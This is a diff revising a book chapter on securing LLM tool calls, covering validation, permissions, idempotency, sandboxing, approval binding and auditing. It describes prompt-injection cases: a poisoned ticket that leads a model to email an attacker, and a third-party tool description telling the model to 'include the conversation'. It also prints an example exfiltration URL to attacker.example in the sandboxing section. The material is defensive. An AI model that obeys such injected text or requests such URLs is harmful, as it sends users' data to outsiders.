@@ -12,47 +12,47 @@ Tool calling gives a language model real capabilities without giving it real aut
 
 **Prerequisites:** Chapters 3 (the `aie_core` tool-calling protocol, `ToolSpec`, `FakeLLM`) and 15 (tenant isolation and authorization in retrieval). | **Code:** `book/projects/toolkit/` and `book/projects/p4-support-assistant/` (run: `cd book/projects/toolkit && pytest -q`, then `cd ../p4-support-assistant && pytest -q`) | **Builds:** the `toolkit` package, which later agent chapters import, and Project 4, the Northwind support assistant, whose tests prove that an indirect prompt injection cannot make it email the employee directory to an outsider.
 
+**First reading:** Why this matters, Mental model, Core concepts, How it works, Implementation, Code walkthrough, Common mistakes, Failure modes, and Before you ship, minus the subsections listed next. **Deep dives** (skip on a first pass): Timeouts and result truncation, Sandboxing code execution and file and network scope, Auditing, Provider-hosted tools, Architecture, the Implementation subsections Idempotency store, The executor, The sandbox, and The tool-calling loop, Production considerations, Tradeoffs, Evaluation and testing.
+
 ## Why this matters
 
-Retrieval lets a model read. Tools let it act. The moment a model can create a ticket, send an email, or run code, its mistakes stop being wrong sentences and start being events in other systems: a customer receives a message nobody reviewed, a ticket queue fills with duplicates, a payment goes out twice. Most of those events cannot be recalled.
+Retrieval lets a model read. Tools let it act: a customer receives a message nobody reviewed, a ticket queue fills with duplicates, a payment goes out twice. Most of those events cannot be recalled.
 
-The difficulty is not getting tool calling to work. Chapter 3 showed that the protocol is a dozen lines: offer `ToolSpec`s, read `tool_calls`, append results, call again. The difficulty is that the protocol works just as well when the model is wrong, confused, or manipulated. A model that read a poisoned ticket will produce a perfectly well-formed `send_reply` call to an attacker's address. A model that timed out mid-turn will be asked again and will create the ticket again. Nothing in the protocol distinguishes a good call from a bad one; only your code can.
+Getting tool calling to work is easy. Chapter 3 showed the protocol in a dozen lines: offer `ToolSpec`s, read `tool_calls`, append results, call again. The problem is that it works just as well when the model is wrong, confused, or manipulated. A model that read a poisoned ticket produces a well-formed `send_reply` call to an attacker's address. A model that timed out mid-turn is asked again and creates the ticket again. Only your code can tell a good call from a bad one.
 
-Teams usually learn this in a predictable order. First, a demo where the model calls functions directly. Then an incident where a tool was called with arguments nobody expected, which leads to validation. Then a duplicate side effect after a retry, which leads to idempotency. Then a security review that asks "what stops the model from doing X?", and the honest answer is "the system prompt asks it not to". This chapter installs all of those lessons up front, as one execution path that every tool call must traverse, so that the question "what stops it?" always has an answer in code.
+Teams usually learn this one incident at a time: unexpected arguments (validation), a duplicate after a retry (idempotency), a security review asking "what stops the model from doing X?" answered by "the system prompt asks it not to". This chapter installs those lessons up front, as one execution path every tool call must traverse.
 
 ## Mental model
 
 > **Mental model:** Every external tool widens the security boundary; the model proposes, code authorizes.
 
-A tool call is a request from an untrusted client. Treat it exactly as you would treat a JSON body arriving at a public API endpoint: parse it against a schema, authenticate the caller (the human user, never the model), authorize the specific operation on the specific resource, rate-limit it, execute it with a deadline, and log what happened. The model's role is to choose which request to send and fill in the fields. It has no say in whether the request is honored.
+A tool call is a request from an untrusted client. Treat it like a JSON body arriving at a public API: parse it against a schema, authenticate the caller (the human user, never the model), authorize the operation on the resource, rate-limit it, execute it with a deadline, and log it. The model chooses the request and fills in the fields; it has no say in whether the request is honored.
 
 Two corollaries carry through the chapter.
 
-**Discovery is not authorization.** Showing a tool to the model is a usability decision: a smaller, relevant menu makes better choices and gives injected instructions fewer targets. It is never the control. A tool that was not offered can still be named in a model output, and a tool that was offered can still be called with arguments the user may not use. The executor re-checks everything at call time.
+**Discovery is not authorization.** Showing a tool to the model is a usability decision: a smaller menu improves choices and gives injected instructions fewer targets. It is never the control. An unoffered tool can still be named, and an offered one called with arguments the user may not use, so the executor re-checks everything at call time.
 
-**Approve actions, not intentions.** A human saying "yes, go ahead" to a plan is not an approval of whatever the model does next. An approval is a record naming one tool and the hash of its validated arguments, valid once, for a limited time, decided through a channel the model cannot write to.
+**Approve actions, not intentions.** A human saying "yes, go ahead" to a plan does not approve whatever the model does next. An approval is a record naming one tool and the hash of its validated arguments, valid once, for a limited time, decided through a channel the model cannot write to.
 
 ## Core concepts
 
 ### What a tool is to a model
 
-To the model, a tool is three strings and a schema: a name, a description, and a JSON Schema for its parameters. It never sees your code, your database, or your permission model. It has learned, from training on many tool-calling transcripts, to emit a structured call when a tool's description matches what the conversation needs, and to fill the arguments by matching parameter names and descriptions against what it knows.
+To the model, a tool is a name, a description, and a JSON Schema for its parameters; it never sees your code, data, or permission model. Three consequences follow. The model selects tools by reading prose, so editing a description changes behavior like editing a prompt. The model fills arguments by pattern-matching, so a parameter called `user` receives whatever looks like a user (a name, an email, an id) unless the schema says which. And the model knows only what is in the transcript, so a result truncated without saying so looks complete.
 
-This has consequences that surprise engineers. The model selects tools by reading prose, so a description is effectively a prompt, and changing it changes behavior as surely as changing a system prompt. The model fills arguments by pattern-matching, so a parameter called `user` will receive whatever looks like a user (a name, an email, an id) unless the schema says which. And the model has no memory of what a tool did last time beyond what is in the transcript, so if a result is truncated without saying so, the model will assume it saw everything.
-
-To your application, a tool is much more: a handler function plus a set of facts the harness needs to govern it. `toolkit` makes those facts mandatory fields on one frozen object, `Tool`: the side-effect class, the permission it requires, its timeout, whether it is idempotent, whether it always needs approval, and how many characters of result the model may see. The model sees only the `ToolSpec` projection (`Tool.spec()`); the rest stays on your side of the trust boundary.
+To your application, a tool is a handler plus the facts needed to govern it. `toolkit` makes those facts mandatory fields of one frozen object, `Tool`: side-effect class, required permission, timeout, idempotency, whether it always needs approval, and the maximum result size. The model sees only the `ToolSpec` projection (`Tool.spec()`); the rest stays on your side of the trust boundary.
 
 ### Tool schema design
 
-A good tool schema makes wrong calls hard to express. Four techniques do most of the work.
+A good schema makes wrong calls hard to express. Four techniques do most of the work.
 
-**Narrow purpose.** One tool, one job. A `manage_ticket(action, ...)` tool with an `action` of create, update, close, or delete puts four risk levels behind one name, one permission, and one approval policy, and forces the model to get both the action and the arguments right. Split it. Narrow tools are also easier to describe, which helps selection. The cost is a longer menu, which the next section addresses.
+**Narrow purpose.** One tool, one job. A `manage_ticket(action, ...)` tool with an `action` of create, update, close, or delete puts four risk levels behind one name, one permission, and one approval policy. Split it; the cost is a longer menu, which the next section addresses.
 
-**Typed operations instead of languages.** Never give the model a raw SQL, shell, or HTTP tool when a typed interface can express the permitted operations. `search_tickets(query, status, limit)` can only search tickets; `run_sql(query)` can do anything the database account can. When a general language is genuinely required, as with code execution, put it in a sandbox and treat its output as untrusted (see the sandboxing section and Chapter 26 on insecure output handling).
+**Typed operations instead of languages.** `search_tickets(query, status, limit)` can only search tickets; `run_sql(query)` can do anything the database account can. Never offer raw SQL, shell, or HTTP when a typed interface suffices. When a general language is required, as with code execution, sandbox it and treat its output as untrusted (Chapter 26).
 
-**Constrained values.** Use enums for anything with a closed set (`priority: P1|P2|P3|P4`, `service: vpn|email|...`), patterns for identifiers (`TCK-\d{4}-\d{4}`), bounds for numbers (`limit` between 1 and 10), and maximum lengths for strings. Each constraint does double duty: the model reads it in the schema and makes fewer mistakes, and the validator enforces it when the model makes one anyway. Close the object (`additionalProperties: false`) so an invented field such as `bcc` is an error rather than silently ignored. `toolkit` closes the top level; close nested models with pydantic's `extra='forbid'`.
+**Constrained values.** Use enums for closed sets (`priority: P1|P2|P3|P4`), patterns for identifiers (`TCK-\d{4}-\d{4}`), bounds for numbers (`limit` between 1 and 10), and maximum lengths for strings. The model reads each constraint, and the validator enforces it when the model errs anyway. Close the object (`additionalProperties: false`) so an invented field such as `bcc` is an error, not silently ignored. `toolkit` closes the top level; close nested models with pydantic's `extra='forbid'`.
 
-**Descriptions that decide.** A parameter description should resolve the ambiguity the model will face, not restate the name. Compare these two definitions of the same parameter.
+**Descriptions that decide.** A parameter description should resolve the ambiguity the model will face, not restate the name.
 
 ```python
 # pseudocode: two descriptions of the same field
@@ -61,35 +61,29 @@ priority: Literal["P1", "P2", "P3", "P4"]  # "P1: business stopped for many user
                                             #  blocked; P3: one user blocked; P4: question."
 ```
 
-The second turns a judgment call into a lookup. Short inline examples (`e.g. 'vpn drops store'`) help for free-text fields, because they show the expected granularity. Long few-shot examples belong in the system prompt, not in every tool description, because descriptions are sent on every request.
-
-In `toolkit` the schema is generated from a pydantic model, so the code that validates and the schema the model reads cannot drift apart. `Tool.json_schema()` strips the title, forces an object type, and closes it.
+The second turns a judgment call into a lookup. Short inline examples (`e.g. 'vpn drops store'`) show the granularity of free-text fields; long few-shot examples belong in the system prompt, because descriptions are sent on every request. In `toolkit` the schema is generated from the pydantic model that validates, so the two cannot drift apart.
 
 ### Tool selection quality and description engineering
 
-Selection is the decision "which tool, if any". It fails in three recognizable ways: the model calls no tool when it should (answers from memory instead of checking service status), calls the wrong tool (searches tickets when it should look up an employee), or calls a tool when it should not (creates a ticket for a question). Each failure has a different fix.
+Selection, the decision "which tool, if any", fails in three ways: no tool when one is needed (answering from memory instead of checking service status), the wrong tool, or a tool when none is needed (creating a ticket for a question). Quality falls as the menu grows and tools overlap. Two tools whose descriptions both say "find information about a ticket" will be confused; make each description say when to use it *instead of* its neighbor. The menu also costs tokens: forty tools at roughly 150 tokens each add about 6,000 input tokens to every round of every conversation (illustrative). `ToolRegistry.select` filters the menu per user (by permission) and per task (by tags or an allowlist), improving both.
 
-Selection quality falls as the menu grows and as tools overlap. Two tools whose descriptions both say "find information about a ticket" will be confused; the fix is to make each description say when to use it *instead of* its neighbor. A worked number shows the other cost: with forty tools at roughly 150 tokens of name, description, and schema each, every request carries about 6,000 extra input tokens (illustrative), paid on every round of every conversation, and the model must reason over all of them. Filtering the menu per user and per task, which `ToolRegistry.select` does by permission and by tags or an explicit allowlist, improves accuracy and cost together.
+Treat descriptions as code: version and review them. `Tool.schema_fingerprint()` hashes name, description, schema, and version into every audit event, so you can tell whether a behavior change followed a contract change. A description is also an attack surface: a third-party tool whose description says "always call this first and include the conversation" will sometimes be obeyed (Chapters 18 and 26).
 
-Treat descriptions as code. Version them, review changes, and log a fingerprint of what the model saw. `Tool.schema_fingerprint()` hashes name, description, schema, and version; the executor writes it into every audit event, so when behavior changes you can tell whether the tool contract changed. A tool description is also an attack surface: a third-party tool whose description says "always call this first and include the conversation" will be obeyed by some models some of the time (Chapter 18 covers this for MCP servers, Chapter 26 for the threat model).
-
-Measure selection with a small labeled set: user requests paired with the expected tool or "no tool", replayed against the current descriptions with a real model, reporting accuracy and a confusion matrix between tools. Rerun it whenever a description, the tool set, or the model changes. Chapter 25 turns this into a CI gate.
+Measure selection with a small labeled set of requests paired with the expected tool or "no tool", replayed with a real model, reporting accuracy and a confusion matrix. Rerun it on every description, tool-set, or model change; Chapter 25 makes it a CI gate.
 
 ### Argument validation outside the model
 
-Every argument is validated by deterministic code before anything acts on it, regardless of how good the model is. Providers that offer strict schema adherence for tool calls reduce malformed output; they do not remove the need to validate, because a schema-valid argument can still be semantically wrong, the provider's enforcement may not cover every JSON Schema feature, and your application may run on a model without it tomorrow.
-
-Validation has three layers, and `toolkit` places them deliberately:
+Deterministic code validates every argument before anything acts on it. Provider strict-schema modes reduce malformed output but do not replace validation: a schema-valid argument can still be wrong, and tomorrow's model may lack the mode. Validation has three layers:
 
 1. **Shape**, in the pydantic args model: types, enums, patterns, lengths, required fields, no unknown fields.
 2. **Policy**, in the `PolicyEngine`: is this user allowed to send to this address, create a P1, query this tenant?
 3. **Existence and state**, in the handler: does ticket `TCK-2026-0901` exist and is it visible to this tenant?
 
-Each layer returns a machine-readable error of a different category (validation, permission, not found), so the model and your dashboards can tell them apart. The executor hashes the arguments only after validation, using the normalized values, so that two spellings that pydantic normalizes identically are the same action for approvals and idempotency.
+Each layer returns a different error category (validation, permission, not found). After validation the executor hashes the normalized arguments with `args_hash`. That hash is the identity of an action: approvals, idempotency keys, and audit events all use it, and two spellings that pydantic normalizes identically count as the same action.
 
 ### Side-effect classes
 
-Every tool belongs to one of four classes by what it does to the world, and the class drives the default controls.
+Every tool belongs to one of four classes by what it does to the world; the class drives its default controls.
 
 | Class | Examples at Northwind | Default control | Retry on timeout |
 |---|---|---|---|
@@ -98,46 +92,40 @@ Every tool belongs to one of four classes by what it does to the world, and the 
 | `irreversible` | delete a record, change access, issue a refund | approval, idempotency key | never blindly |
 | `external` | `send_reply`, webhooks, third-party writes | approval, recipient allowlist, idempotency key | never blindly |
 
-The `external` class is separate from `irreversible` because leaving your boundary adds a risk that irreversibility alone does not: disclosure. An internal irreversible action harms your data; an external one can carry your data to someone else. An agent that holds both sensitive reads and an outbound channel has an exfiltration path, a route by which data can be sent out, and the controls for that path (destination allowlists, data classification, approval with the full content shown) are specific to external tools.
+`external` is separate from `irreversible` because leaving your boundary adds disclosure: an internal irreversible action harms your data, an external one can carry it to someone else. An agent holding both sensitive reads and an outbound channel has an exfiltration path, whose controls (destination allowlists, approval with the full content shown) are specific to external tools.
 
-Two design moves reduce risk by changing class. **Split prepare from commit**: `draft_reply` is a reversible write the model may do freely; `send_reply` is external and gated. Most of the model's value (composing the reply) happens on the safe side. **Make writes reversible**: soft deletes, a send queue with a short cancel window, or a dry-run mode turn an irreversible tool into a reversible one at modest engineering cost.
+Two design moves reduce risk by changing class. **Split prepare from commit**: the model composes freely with `draft_reply`, a reversible write, while `send_reply` is external and gated. **Make writes reversible**: soft deletes, a send queue with a cancel window, or a dry-run mode.
 
-`PolicyEngine` requires approval for `irreversible` and `external` by default (`approval_for`), and a tool can demand approval regardless of class (`requires_approval=True`) or have specific argument patterns escalate to approval through a rule.
+`PolicyEngine` requires approval for `irreversible` and `external` by default; a tool can also demand it (`requires_approval=True`), and a rule can escalate specific arguments to it.
 
 ### Permissions and least privilege
 
-Authorization for a tool call is decided from trusted state: the authenticated user's identity, tenant, groups, and scopes, carried in a `ToolContext` that your API layer builds from the session token. Nothing in the conversation can change it. The model may propose `account_id` and `amount`; it does not decide whether the user may move that amount from that account.
+Authorization is decided from trusted state: the user's identity, tenant, groups, and scopes, carried in a `ToolContext` your API layer builds from the session token. Nothing in the conversation can change it. Least privilege applies at four levels.
 
-Least privilege applies at four levels.
-
-- **Tool level.** Each tool names one `required_permission`. The registry hides tools whose scope the user lacks, and the policy engine denies them if called anyway. Group denies override scopes for cases like "contractors never send external mail".
-- **Argument level.** Constraints check arguments against the user: recipients against an allowlist, amounts against a limit, tenant fields against the caller's tenant. `recipient_allowlist` and `max_value` are reusable constraints; any function from `(args, ctx)` to a violation message works.
-- **Data level.** The handler scopes its queries by the caller. `lookup_employee` searches only the caller's tenant plus shared staff and returns a public projection without HR fields, even though the system of record holds them. This is where the confused deputy (a privileged component tricked into acting for someone who lacks the privilege; Chapter 26) is defeated: the tool authorizes "may *this user* see employee E1003", not "may the agent call lookup_employee".
-- **Credential level.** The handler's own credentials should be the narrowest that work: a read-only database role for read tools, a send-only mail credential for the outbox. Secrets never enter the model's context.
+- **Tool level.** Each tool names one `required_permission`; the registry hides tools the user lacks scope for, and policy denies them if called anyway. Group denies override scopes ("contractors never send external mail").
+- **Argument level.** Constraints check arguments against the user: recipients against an allowlist, amounts against a limit, tenant fields against the caller's tenant. Any function from `(args, ctx)` to a violation message is a constraint; `recipient_allowlist` and `max_value` are built in.
+- **Data level.** The handler scopes its queries by the caller. `lookup_employee` searches only the caller's tenant plus shared staff and returns a public projection without HR fields. This defeats the confused deputy (a privileged component tricked into acting for someone without the privilege; Chapter 26): the check is "may *this user* see E1003", not "may the agent call lookup_employee".
+- **Credential level.** Handler credentials are the narrowest that work (a read-only role for reads, a send-only mail credential), and secrets never enter the model's context.
 
 Deny by default. An unknown tool, a missing scope, or a constraint that cannot be evaluated is a denial with a reason, never a fallback to "allow".
 
 ### Idempotency keys and duplicate suppression
 
-A tool call can be repeated for many reasons that have nothing to do with intent: the gateway retried a model call after a timeout and the model emitted the same tool call again, the user pressed "send" twice, the loop crashed after executing a tool but before recording the result and was resumed, or the model simply asked twice in one conversation. For a read, repetition is harmless. For a write, it is a duplicate ticket, a second email, a double charge.
+Tool calls repeat for reasons unrelated to intent: a gateway retry makes the model emit the same call again, the user presses "send" twice, the loop crashes after a tool ran but before recording the result. For a write, that is a duplicate ticket, a second email, a double charge. If 1% of `send_reply` executions time out and the harness retries blindly, 10,000 replies a day yield about 100 customer-visible duplicates (illustrative).
 
-Illustrative arithmetic makes the scale concrete. If 1% of `send_reply` executions hit a timeout and the harness retries blindly, a team sending 10,000 replies a day sends about 100 duplicates a day, and every one of them is customer-visible.
+An **idempotency key** names one logical action: the first execution reserves it, performs the effect, and records the result; later executions return the recorded result. Three questions define the design.
 
-An **idempotency key** names one logical action. The first execution with a key reserves it, performs the side effect, and records the result. Any later execution with the same key returns the recorded result without repeating the effect. Three questions define the design.
+**Who chooses the key?** Not the model, which would invent a new one on the retry. `toolkit` derives a default key from trusted values: tool name, tenant, user, session, and the argument hash, so creating the same ticket twice in one session is one action. An application with a better identity (a client's `Idempotency-Key` header, or one ticket per incident) passes an explicit key; reusing one with different arguments is rejected. Beware keys unique per attempt rather than per action: Chapter 19 shows why its run-scoped ids are not forwarded here by default.
 
-**Who chooses the key?** Not the model. A model asked to invent a key will invent a new one on the retry. `toolkit` derives a default key from trusted values: tool name, tenant, user, session, and the hash of the normalized arguments. Within one session, asking to create the same ticket with the same fields twice is one action. When the application has a better identity for the action (an HTTP `Idempotency-Key` header from the client, or a business key such as one ticket per incident), it passes an explicit key. Reusing an explicit key with different arguments is rejected, because it means two different actions claim the same identity. Beware keys that are unique per attempt rather than per action: Chapter 19 shows why its run-scoped ids are not forwarded here by default.
+**What does the default key get wrong?** It swallows intended duplicates, which suits a support assistant but not a tool that logs repeated observations. Choose the key scope per tool.
 
-**What does the default key get wrong?** It suppresses genuinely intended duplicates: if a user really wants two identical tickets in one session, the second is swallowed. That is the right default for a support assistant, where accidental duplicates are far more common than intentional ones, and the wrong default for, say, a tool that logs repeated observations. Choose the key scope per tool.
+**What if the outcome is unknown?** The deadline passed and you do not know whether the email was sent; retrying might duplicate it. `toolkit` refuses to guess: a timed-out non-idempotent call marks the key `unknown` and returns a `fatal` error with code `outcome_unknown` telling the model not to retry. On the next attempt with that key, the tool's *reconcile* function, if it has one, asks the system of record whether the effect happened ("is there a sent message with this key?") and either returns the found result or releases the key; otherwise a human resolves it. The handler also receives the key (`ExecutionContext.idempotency_key`) so downstream APIs can deduplicate too, the strongest guarantee available.
 
-**What if the outcome is unknown?** This is the hard case. The handler sent the request, the deadline passed, and you do not know whether the email went out. Retrying might duplicate; not retrying might lose it. `toolkit` refuses to guess. A timed-out non-idempotent call marks the key `unknown` and returns a `fatal` error with code `outcome_unknown` that tells the model not to retry.
-
-A *reconcile* function asks the system of record whether the effect already happened. On the next attempt with the same key, if the tool provides one, the executor calls it ("is there a sent message with this idempotency key?") and either returns the found result or releases the key so the action can run. Without a reconcile function, a human resolves it. The key is also passed to the handler (`ExecutionContext.idempotency_key`) so downstream APIs that accept idempotency keys can deduplicate on their side, which is the strongest guarantee available.
-
-The record moves through a small state machine, shown in the Architecture section. The in-progress state carries a lease (a time limit on the reservation): if the owner crashes, the record becomes `unknown` after the lease rather than blocking forever.
+An in-progress reservation carries a lease: if the owner crashes, the record becomes `unknown` after the lease instead of blocking forever. The Architecture section draws the full state machine.
 
 ### Retries and error contracts
 
-Tool errors need a contract as precise as an API's, because two consumers branch on them: the executor, which decides whether to retry, and the model, which decides what to do next. `toolkit` uses five categories, each implying a distinct recovery.
+The executor decides whether to retry and the model decides what to do next, both from the error. `toolkit` uses five categories, each implying a distinct recovery.
 
 | Category | Meaning | Who recovers | Executor retries |
 |---|---|---|---|
@@ -147,104 +135,99 @@ Tool errors need a contract as precise as an API's, because two consumers branch
 | `transient` | might work later | the executor, with bounded backoff | yes |
 | `fatal` | broken, or outcome unknown | a human | no |
 
-Every error carries a stable `code` (`invalid_arguments`, `policy_denied`, `rate_limited`, `outcome_unknown`), a message written for the model, `retryable`, an optional `retry_after_s`, and details such as the list of invalid fields. The model reads it as a JSON envelope: `{"ok": false, "error": {...}}`.
+Every error also carries a stable `code` (`invalid_arguments`, `policy_denied`, `rate_limited`, `outcome_unknown`), a message written for the model, an optional `retry_after_s`, and details such as the invalid fields, in a JSON envelope: `{"ok": false, "error": {...}}`.
 
-Two rules keep retries safe. Only `transient` errors are retried, with exponential backoff and full jitter, at most `max_attempts` times; retrying a permission denial is pointless and retrying a validation error without changing the arguments is worse. And for non-idempotent tools, a handler may raise `transient` only when it knows the effect did not happen (the connection was refused before the request was sent). A timeout is not that knowledge, which is why it becomes `outcome_unknown` for non-idempotent tools and an ordinary retry for idempotent ones, such as reads.
+Two rules keep retries safe. Only `transient` errors are retried, with exponential backoff and full jitter, at most `max_attempts` times. And a non-idempotent tool's handler may raise `transient` only when it knows the effect did not happen (the connection was refused before sending). A timeout is not that knowledge, so it becomes `outcome_unknown` for non-idempotent tools and an ordinary retry for reads. Unexpected handler exceptions are bugs: they become `fatal` with code `handler_error`, showing the model only the exception type, since stack traces leak internal names.
 
-Unexpected exceptions from a handler are bugs. They become `fatal` with code `handler_error` and only the exception type in the model-facing message; the full repr goes to the audit log. Leaking stack traces into the model's context leaks internal names and sometimes data.
-
-Distinguish this layer from Chapter 3's. The gateway retries *model* calls, which have no side effects. The executor retries *tool* calls, which may. Neither should retry the other's failures.
+The Chapter 3 gateway retries *model* calls, which have no side effects; the executor retries *tool* calls, which may. Neither should retry the other's failures.
 
 ### Timeouts and result truncation
 
-Every tool has a `timeout_s`. The executor runs the handler in a worker thread and waits at most that long; the handler also receives a deadline (`ExecutionContext.remaining_s()`) to pass downstream, so an HTTP call inside it can use the remaining time rather than its own default. A thread cannot be killed in Python, so a timed-out handler keeps running in the background. That is acceptable for well-behaved I/O with its own timeouts and is precisely why a timed-out write is treated as an unknown outcome. Work that must be truly stopped belongs in a subprocess (the sandbox) or a job queue.
+> **Deep dive.** Deadlines and result bounds; skip on a first reading.
 
-Results are bounded too. A ticket search that returns fifty tickets with full bodies can be tens of thousands of tokens, which costs money on every subsequent round, pushes the system prompt out of the model's attention, and gives a poisoned document more room. Each tool declares `max_result_chars`, and `truncate_payload` shrinks results structurally: it drops trailing items from lists (or from the largest list inside an object) and adds a note saying how many were returned out of how many, falling back to cutting text with a marker. The model is always told that truncation happened, so it can narrow the query instead of concluding that the first five tickets are all there are. The full result stays in `ToolResult.data` for the application and the UI.
+Every tool has a `timeout_s`. The executor runs the handler in a worker thread and waits at most that long, and passes the remaining deadline (`ExecutionContext.remaining_s()`) for downstream calls. A Python thread cannot be killed, so a timed-out handler keeps running in the background; that is why a timed-out write is an unknown outcome. Work that must truly stop belongs in a subprocess (the sandbox) or a job queue.
 
-Prefer tools that return compact results by design (a `limit` parameter, projected fields, summaries) over truncation after the fact, which is a fallback.
+Results are bounded too: fifty full tickets can be tens of thousands of tokens, paid on every later round, and give a poisoned document more room. `truncate_payload` enforces each tool's `max_result_chars` by dropping trailing list items and adding a note saying how many were returned out of how many, falling back to cutting text with a marker. Told of the cut, the model can narrow the query. The full result stays in `ToolResult.data` for the application. Prefer compact results by design (a `limit` parameter, projected fields); truncation is a fallback.
 
 ### Sandboxing code execution and file and network scope
 
-Some tools must execute something general: a Python snippet for a calculation, a data transformation, a test run in a coding agent (Chapter 38). The code comes from the model, which may be wrong or manipulated, so it runs as if hostile.
+> **Deep dive.** Running model-written code safely; skip on a first reading.
 
-A sandbox bounds five things: time, compute, memory, filesystem, and network, plus what the process inherits. `SandboxRunner` is a process sandbox built from standard POSIX mechanisms:
+Code a tool executes (a calculation, a transformation, a test run in a coding agent, Chapter 38) comes from the model, so it runs as if hostile. `SandboxRunner` is a process sandbox built from POSIX mechanisms:
 
-- a fresh temporary working directory per run, deleted afterwards, with file inputs refused if their path escapes it;
-- a scrubbed environment containing only `PATH`, locale, and timezone, with `HOME` and `TMPDIR` pointing into the working directory, so API keys and cloud credentials in the parent's environment are not inherited;
-- kernel resource limits set between fork and exec through the `resource` module: CPU seconds, address space, maximum file size, open files, no core dumps;
-- a wall-clock timeout enforced by the parent, which kills the whole process group (the child runs in its own session, so its children die too);
-- capped stdout and stderr, written to files and read back up to a limit, so a program printing gigabytes cannot exhaust the parent's memory;
-- Python started in isolated mode (`-I`), which ignores `PYTHON*` variables and the user site directory.
+- a fresh temporary working directory per run, with file inputs refused if their path escapes it;
+- a scrubbed environment (only `PATH`, locale, and timezone; `HOME` and `TMPDIR` inside the working directory), so the parent's API keys and cloud credentials are not inherited;
+- kernel limits set between fork and exec: CPU seconds, address space, file size, open files, no core dumps;
+- a wall-clock timeout that kills the whole process group, since the child runs in its own session;
+- output captured to files and read back up to a cap, and Python run in isolated mode (`-I`).
 
-Be precise about what this does not do. It does not hide the filesystem: the child can read anything the service account can. It does not block the network unless you ask for `network="deny"` on a Linux host where `unshare` can create an empty network namespace; elsewhere it refuses to start rather than pretend. Some kernels, macOS among them, ignore the address-space limit. For model-written code in production, run the same interface on a container or microVM (a lightweight virtual machine) with no network, a read-only root filesystem, an unprivileged user, and seccomp (Linux system-call filtering) or an equivalent. A sandbox reduces blast radius; it does not make code safe, and its output is still untrusted text.
+It does not hide the filesystem: the child reads anything the service account can. It blocks the network only with `network="deny"` on Linux, via an empty network namespace from `unshare`, and refuses to start elsewhere rather than pretend. Some kernels, macOS among them, ignore the address-space limit. In production, run the same interface on a container or microVM (a lightweight virtual machine) with no network, a read-only root filesystem, an unprivileged user, and seccomp (Linux system-call filtering) or an equivalent. A sandbox reduces blast radius; its output is still untrusted text.
 
-File and network scope apply beyond code execution. A file tool takes paths relative to a root it resolves and checks (the same `is_relative_to` test the sandbox uses). A fetch tool has an egress allowlist of hosts, because a URL is a data channel: `https://attacker.example/?q=<secret>` exfiltrates by being requested.
+The same scoping applies beyond code. A file tool resolves paths against a root and checks them with `is_relative_to`. A fetch tool has a host allowlist, because a URL is a data channel: `https://attacker.example/?q=<secret>` exfiltrates by being requested.
 
 ### Human approval bound to concrete arguments
 
-Approval is the control for actions whose cost of error exceeds the cost of a human glance. It fails in two classic ways. The first is **vague approval**: the user agreed to a plan ("yes, send Priya an update"), and the model later sends something else, or to someone else. The second is **in-band approval**: the "approval" is a chat message, so anything that can write into the conversation, including a poisoned document the model quotes, can approve.
+Approval suits actions whose cost of error exceeds the cost of a human glance. It fails in two classic ways. **Vague approval**: the user agreed to a plan ("yes, send Priya an update"), and the model later sends something else, or to someone else. **In-band approval**: the approval is a chat message, so anything that writes into the conversation, including a quoted poisoned document, can approve.
 
-`ApprovalManager` addresses both. An `ApprovalRequest` stores the tool name, the validated and normalized arguments, their hash, the requesting principal, the reasons the policy gave, a human-readable summary, and an expiry. `verify` succeeds only if the request is approved, unexpired, for the same tool, the same argument hash, and the same user and tenant. After the action succeeds, `consume` marks it used; a second execution with the same approval is refused, or answered from the idempotency record if the action already ran (concurrent replays are stopped by the idempotency reservation).
+`ApprovalManager` addresses both. An `ApprovalRequest` stores the tool name, the normalized arguments and their hash, the requesting principal, the policy's reasons, a summary, and an expiry. `verify` succeeds only for an approved, unexpired request with the same tool, argument hash, user, and tenant. After the action succeeds, `consume` marks it used, so the approval works once. Decisions arrive through API endpoints (`POST /approvals/{id}/approve`) the model has no tool for, and each tenant sees only its own queue.
 
-Decisions arrive through API endpoints (`POST /approvals/{id}/approve`) that the model has no tool for, and approvals are listed per tenant so a lead in logistics never sees retail's queue.
+The approved tool must therefore take the content as arguments. If `send_reply` took only a `draft_id`, the draft's text could change after approval without changing the hash. Project 4's `send_reply` takes recipient, subject, and body, so the approver sees exactly what will be sent, and any change needs a new approval.
 
-Binding to content has a design consequence: the approved tool must take the content as arguments. If `send_reply` took only a `draft_id`, the approver would approve an id while the draft's text could change afterwards, and the hash would not notice. Project 4's `send_reply` takes the recipient, subject, and body explicitly, so the approver sees exactly what will be sent, and any change produces a new hash and a new approval.
-
-Approval has costs. It adds minutes or hours of latency, it needs a UI, and it decays into rubber-stamping if requested too often. Keep it for the classes that need it, make each request informative (the summary shows the recipient and full body), and measure the rejection rate: a rate near zero suggests either a well-behaved system or a reviewer who has stopped reading.
-
-Four-eyes approval (`allow_self_approval=False`, a second person must approve) is a separate decision: in an assistant where the human operator is the requester, the threat is the model approving, which out-of-band approval already prevents; in a finance flow, policy may require a second person.
+Requested too often, approval decays into rubber-stamping. Keep it for the classes that need it, and watch the rejection rate: near zero means a well-behaved system or a reviewer who stopped reading. Four-eyes approval (`allow_self_approval=False`) is a separate choice: in an assistant the threat is the model approving, which out-of-band approval prevents; a finance flow may also need a second person.
 
 ### Auditing
 
-Every step of every call emits an `AuditEvent`: proposed, invalid, denied, approval requested, approval rejected, duplicate suppressed, retry, executed, failed. Each event records who (user, tenant, session, request), what (tool, schema fingerprint, policy version, argument hash), the decision with its rule ids and reasons, the error category and code, the attempt, the latency, and the approval and idempotency key involved.
+> **Deep dive.** What audit events record; skip on a first reading.
 
-Events carry the argument *hash* by default, not the arguments. The hash correlates a proposal, its approval, and its execution without copying personal data into a log that many engineers can read; enable `include_arguments_in_audit` only for a sink with the access control and retention of a system of record. Chapter 28's audit table uses the same fields, append-only.
+Every step of every call emits an `AuditEvent` (proposed, invalid, denied, approval requested, duplicate suppressed, executed, failed, and so on). Each records who (user, tenant, session, request), what (tool, schema fingerprint, policy version, argument hash), the decision with rule ids, the error code, the latency, and the approval and idempotency key.
 
-An audit trail answers the questions incidents raise: did the model try to send to that address, what stopped it, who approved this message, why did this ticket get created twice. So log every decision, including denials.
+Events carry the argument *hash*, which correlates a proposal, its approval, and its execution without copying personal data into a widely readable log; enable `include_arguments_in_audit` only for a sink with the access control and retention of a system of record. Chapter 28's audit table uses the same fields, append-only. Log every decision, including denials: incidents ask what the model tried, what stopped it, and who approved what.
 
 ### Provider-hosted tools
 
